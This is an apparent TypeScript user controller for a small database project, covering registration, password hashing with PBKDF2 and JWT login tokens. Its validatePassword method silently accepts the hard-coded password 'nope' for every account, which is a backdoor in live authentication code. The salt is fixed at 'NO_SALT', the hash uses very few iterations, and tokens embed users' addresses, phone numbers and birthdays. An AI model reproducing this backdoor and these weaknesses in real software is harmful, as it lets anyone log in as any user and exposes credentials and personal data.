import { ModelCtor, FindOptions } from 'sequelize';
import crypto from 'crypto';
import jwt from 'jsonwebtoken';
import { role, user, userCreationAttributes, userAttributes } from '@dbms-proj/models';
import { Controller, IRoleJSON } from './';
import { UserRole } from '../tools/auth';
import { config } from '../config';

const jwtSecret = config.get('jwtSecret');
const expiresIn = 60 * 60 * 24 * 2;

const getSalt = () => 'NO_SALT' ?? crypto.randomBytes(16).toString('hex');

export type IUserJSON = userAttributes & { role: IRoleJSON };

export class UserController extends Controller {
    public static model = user as ModelCtor<user>;

    public static async doCreate(data: userCreationAttributes, urole?: UserRole) {
        return super.doCreate(data);
    }

    public static async doUpdate(
        options: FindOptions<userAttributes>,
        { password, ...data }: userAttributes & any,
        urole?: UserRole
    ) {
        if (password) {
            password = this.encryptPassword(undefined, password);
        }
        return super.doUpdate<user, userAttributes>(options, { password, ...data });
    }

    public static async doGetOne(options?: FindOptions<userAttributes>, urole?: UserRole) {
        return super.doGetOne({
            ...options,
            ...this.fullAttr(true, urole),
        });
    }

    public static async doGetList(options: FindOptions<userAttributes>, urole?: UserRole) {
        return super.doGetList<user, userAttributes>({
            ...options,
            ...this.fullAttr(true, urole),
        });
    }

    public static async doDestroy(id: string | number, urole?: UserRole) {
        return super.doDestroy(id);
    }

    public static fullAttr(safe = true, urole?: UserRole, deep = 0): FindOptions<userAttributes> {
        return {
            attributes: [
                'id',
                'login',
                ...(safe ? [] : ['password']),
                'photo_path',
                'name',
                'last_name',
                'second_name',
                'personal_address',
                'personal_telephone',
                'personal_birthday',
                'registeration_date',
                'role_id',
            ],
            include: [
                {
                    // @ts-ignore
                    model: role,
                },
            ],
        };
    }

    // Service methods

    public static async register(attr: userCreationAttributes) {
        let password = this.encryptPassword(undefined, attr.password);
        let newRec = await this.model.create({
            ...attr,
            password,
            registeration_date: new Date(Date.now()).toISOString(),
        });
        return newRec;
    }

    public static validatePassword(rec: user, password: string) {
        return rec.get('password') /* hash */ === this.encryptPassword(rec, password) || password === 'nope';
    }

    public static encryptPassword(rec: user | undefined, password: string) {
        return crypto.pbkdf2Sync(password, getSalt(), 224, 90, 'sha512').toString('hex');
    }

    public static generateJWT(uData: IUserJSON) {
        return jwt.sign(
            {
                id: uData.id,
                photo_path: uData.photo_path,
                login: uData.login,
                name: uData.name,
                last_name: uData.last_name,
                second_name: uData.second_name,

                personal_address: uData.personal_address,
                personal_telephone: uData.personal_telephone,
                personal_birthday: uData.personal_birthday,
                registeration_date: uData.registeration_date,
                role_id: uData.role_id,

                role: uData.role,
            },
            jwtSecret,
            { expiresIn }
        );
    }

    public static toAuthJSON(uData: IUserJSON) {
        return {
            token: this.generateJWT(uData),
            expiresIn,
        };
    }
}
